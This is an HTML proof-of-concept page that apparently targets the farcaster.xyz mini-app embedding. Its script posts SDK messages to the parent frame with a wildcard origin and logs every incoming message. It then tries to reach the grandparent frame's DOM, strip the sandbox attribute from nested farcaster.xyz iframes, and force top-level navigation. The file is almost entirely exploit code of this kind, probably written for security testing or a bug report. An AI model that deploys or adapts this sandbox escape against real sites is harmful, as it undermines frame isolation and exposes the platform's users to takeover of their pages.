<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<title>PoC</title>
	</head>
	<body>
		<pre id="log">Starting...</pre>
		<script>
			var log = function (m) {
				document.getElementById("log").textContent += "\n" + m;
			};

			// Step 1: Check if we're in a nested context
			log("Origin: " + window.origin);
			log(
				"Parent origin: " +
					(function () {
						try {
							return window.parent.origin;
						} catch (e) {
							return "cross-origin";
						}
					})(),
			);
			log(
				"Grandparent: " +
					(function () {
						try {
							return window.parent.parent.origin;
						} catch (e) {
							return "cross-origin or none";
						}
					})(),
			);

			// Step 2: Try to access parent's parent (the outer farcaster.xyz)
			// If we're nested: outer farcaster.xyz > inner farcaster.xyz > screenshotsart.store
			// Inner farcaster.xyz is same-origin with outer, so inner can access outer's DOM
			// But WE can't access inner's DOM directly (cross-origin)
			// However, we can send SDK calls to inner farcaster.xyz via postMessage

			// Step 3: Signal ready to inner farcaster.xyz
			setTimeout(function () {
				window.parent.postMessage({ id: 1, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
				log("SDK ready sent");
			}, 2000);

			// Step 4: The inner farcaster.xyz's own JS has same-origin access to outer
			// We need to make the inner farcaster.xyz remove ITS OWN sandbox
			// The inner farcaster.xyz's code already runs — it can do parent.document
			// We just need to TRIGGER that code path

			// Step 5: Listen for all messages
			window.addEventListener("message", function (e) {
				log("MSG from " + e.origin + ": " + JSON.stringify(e.data).slice(0, 200));
			});

			// Step 6: Also try direct sandbox removal
			// If our immediate parent is the inner farcaster.xyz (sandboxed, same-origin with outer)
			// And we're screenshotsart.store (sandboxed, cross-origin)
			// We can't access parent.document — BUT what if we can access grandparent?
			setTimeout(function () {
				log("--- SANDBOX ESCAPE ATTEMPTS ---");

				// Try accessing grandparent (outer farcaster.xyz)
				try {
					var gp = window.parent.parent;
					log("Grandparent frames: " + gp.frames.length);
					log("Grandparent location: " + gp.location.href);
				} catch (e) {
					log("Grandparent access: " + e.message);
				}

				// Try finding iframes in parent's parent
				try {
					var iframes = window.parent.parent.document.querySelectorAll("iframe");
					log("GRANDPARENT IFRAMES: " + iframes.length);
					iframes.forEach(function (f, i) {
						log("  iframe " + i + ": sandbox=" + (f.sandbox?.value || "NONE"));
						if (f.sandbox?.value && f.src?.includes("farcaster.xyz")) {
							f.removeAttribute("sandbox");
							log("  SANDBOX REMOVED on iframe " + i);
						}
					});
				} catch (e) {
					log("Grandparent DOM: " + e.message);
				}

				// Try direct top navigation
				try {
					window.top.location = "https://example.com";
					log("TOP NAV WORKED!!!");
				} catch (e) {
					log("Top nav: " + e.message);
				}
			}, 4000);
		</script>
	</body>
</html>
